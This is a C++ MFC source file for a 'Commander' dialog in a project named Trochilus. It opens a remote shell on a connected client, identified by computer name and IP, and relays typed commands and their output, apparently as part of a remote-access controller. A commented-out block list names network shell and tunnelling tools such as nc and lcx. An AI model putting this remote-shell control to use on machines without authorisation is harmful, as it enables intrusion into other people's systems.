// CmdDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Trochilus.h"
#include "CmdDlg.h"
#include "afxdialogex.h"


// CCmdDlg 对话框

IMPLEMENT_DYNAMIC(CCmdDlg, CDialogEx)

CCmdDlg::CCmdDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CCmdDlg::IDD, pParent)
{

}

CCmdDlg::~CCmdDlg()
{
}

void CCmdDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_RESULT, m_editResult);
}

void CCmdDlg::HandleModuleMsg( LPCTSTR clientid,UINT nMsg, LPVOID lpContext, LPVOID lpParameter )
{
	CCmdDlg* lpDlg = (CCmdDlg*)lpParameter;
	return lpDlg->HandleModuleMsgProc(nMsg,lpContext,lpParameter);
}

void CCmdDlg::HandleModuleMsgProc(UINT nMsg, LPVOID lpContext, LPVOID lpParameter)
{
	if (nMsg == MODULE_MSG_CMDOUTPUT)
	{
		CString strResult;
		CString strOutput;

		strOutput = a2t((LPCSTR)lpContext);

		GetDlgItemText(IDC_EDIT_RESULT,strResult);

		m_strResult = strResult+strOutput;

		SetDlgItemText(IDC_EDIT_RESULT,m_strResult);
		
		m_editResult.LineScroll(m_editResult.GetLineCount());
		m_editResult.SetSel(-1);
	}

}


BEGIN_MESSAGE_MAP(CCmdDlg, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON_OPEN, &CCmdDlg::OnBnClickedButtonOpen)
	ON_BN_CLICKED(IDC_BUTTON_CLOSE, &CCmdDlg::OnBnClickedButtonClose)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
	ON_EN_CHANGE(IDC_EDIT_RESULT, &CCmdDlg::OnEnChangeEditResult)
	ON_WM_SIZE()
END_MESSAGE_MAP()


// CCmdDlg 消息处理程序

void CCmdDlg::EnableButton(BOOL isOpen)
{
	if (!isOpen)
	{
		m_strResult = _T("");
		SetDlgItemText(IDC_EDIT_RESULT,_T(""));
		GetDlgItem(IDC_BUTTON_CLOSE)->EnableWindow(FALSE);
		GetDlgItem(IDC_BUTTON_OPEN)->EnableWindow(TRUE);
	}
	else
	{
		m_strResult = _T("");
		SetDlgItemText(IDC_EDIT_RESULT,_T(""));
		GetDlgItem(IDC_BUTTON_CLOSE)->EnableWindow(TRUE);
		GetDlgItem(IDC_BUTTON_OPEN)->EnableWindow(FALSE);
	}

}

BOOL CCmdDlg::OnInitDialog()
{
	CString strTitle;
	CLIENT_INFO info;

	BOOL ret = GetClientInfo(m_clientid,&info);

	if (ret )
	{
		IN_ADDR connectIP;
		connectIP.S_un.S_addr = info.connectIP;

		strTitle.Format(_T("Commander [%s][%s]"),info.computerName,CString(inet_ntoa(connectIP)).GetBuffer());

		SetWindowText(strTitle);
	}

	__super::OnInitDialog();

	InitDisable();
	m_bkBrush.CreateSolidBrush(RGB(0,0,0));


	InitResize();

	EnableButton(FALSE);

	

	return TRUE;
}


void CCmdDlg::OnBnClickedButtonOpen()
{
	if (OpenShell(m_clientid,HandleModuleMsg,this))
	{
		EnableButton(TRUE);
	}
	else
	{
		AfxMessageBox(_T("Open Commander Error!"));
	}
}


void CCmdDlg::OnBnClickedButtonClose()
{
	CloseShell((LPCWSTR)m_clientid.GetBuffer());
	EnableButton(FALSE);
}


void CCmdDlg::OnClose()
{
//	__super::OnClose();
	this->ShowWindow(FALSE);
//	CloseShell((LPCWSTR)m_clientid.GetBuffer());	
}

HBRUSH CCmdDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = __super::OnCtlColor(pDC, pWnd, nCtlColor);

	if(nCtlColor==CTLCOLOR_EDIT &&
		pWnd->GetDlgCtrlID()==IDC_EDIT_RESULT)
	{
		pDC->SetTextColor(RGB(0,255,0));
		pDC->SetBkColor(RGB(0,0,0));
		pDC->SetBkMode(TRANSPARENT);
		hbr = (HBRUSH)m_bkBrush;
	}
	return hbr;
} 

void CCmdDlg::InitDisable()
{
// 	m_arrDis.Add(_T("nc"));
// 	m_arrDis.Add(_T("lcx"));
// 	m_arrDis.Add(_T("hd"));
// 	m_arrDis.Add(_T("cmd"));
}

BOOL CCmdDlg::IsDisable( CString strCmd )
{
	int nCount = m_arrDis.GetCount();

	for (int i = 0 ; i < nCount ; i++)
	{
		if (strCmd.Find(m_arrDis.GetAt(i)) != -1)
		{
			return TRUE;
		}
	}

	return FALSE;
}

BOOL CCmdDlg::PreTranslateMessage(MSG* pMsg)
{
	CString strCmd;

	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
			return true;

		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_editResult.m_hWnd)
		{
			int	len = m_editResult.GetWindowTextLength();
			CString strText;

			m_editResult.GetWindowText(strText);

			strCmd = strText.GetBuffer() + m_strResult.GetLength();

			strCmd.TrimLeft();
			strCmd.TrimRight();
			strText += _T("\r\n");

			if (0 == strCmd.CompareNoCase(_T("exit")))
			{
				OnBnClickedButtonClose();
				return true;
			}
			else if (0 == strCmd.CompareNoCase(_T("cls")))
			{
				m_strResult = _T("\r\n")+m_strResult.Right(m_strResult.GetLength()-m_strResult.ReverseFind('\n')-1); 
				SetDlgItemText(IDC_EDIT_RESULT,m_strResult);
				return true;
			}
			else
			{
				if (IsDisable(strCmd))
				{
					AfxMessageBox(_T("Don't use the string!"));
				}
				else
				{
					ExecuteShellCommand(m_clientid, strCmd);
					m_editResult.SetSel(-1);
				}
			}
			m_nCurSel = m_editResult.GetWindowTextLength();
		}
		// 限制VK_BACK
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_editResult.m_hWnd)
		{
			if (m_editResult.GetWindowTextLength() <= m_strResult.GetLength())
				return true;
			else
			{
				CString strText;
				GetDlgItemText(IDC_EDIT_RESULT,strText);
				strText.Left(strText.GetLength()-1);
				SetDlgItemText(IDC_EDIT_RESULT,strText);
				UpdateData(TRUE);
			}
		}
	}
	// Ctrl没按下
	if (pMsg->message == WM_CHAR && GetKeyState(VK_CONTROL) >= 0)
	{
		int	nSize = m_editResult.GetWindowTextLength();
		m_editResult.SetSel(nSize, nSize);
		// 用户删除了部分内容，改变m_nCurSel
		if (nSize < m_nCurSel)
			m_nCurSel = nSize;
	}

	return __super::PreTranslateMessage(pMsg);
}


void CCmdDlg::OnEnChangeEditResult()
{
	int nSize = m_editResult.GetWindowTextLength();
	if (nSize < m_nCurSel)
		m_nCurSel = nSize;
}
void CCmdDlg::InitResize()
{

	static CResizer::CBorderInfo s_bi[] = {
		{IDC_EDIT_RESULT,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eLeft},
		{CResizer::eFixed, IDC_MAIN, CResizer::eTop},
		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_BUTTON_OPEN,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}},
		{IDC_BUTTON_CLOSE,    
		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom},
		{CResizer::eFixed, IDC_MAIN, CResizer::eRight},
		{CResizer::eFixed, IDC_MAIN, CResizer::eBottom}}
	};

	const int nSize = sizeof(s_bi)/sizeof(s_bi[0]);
	m_resizer.Init(m_hWnd, NULL, s_bi, nSize);
}
void CCmdDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialogEx::OnSize(nType, cx, cy);
	m_resizer.Move();
}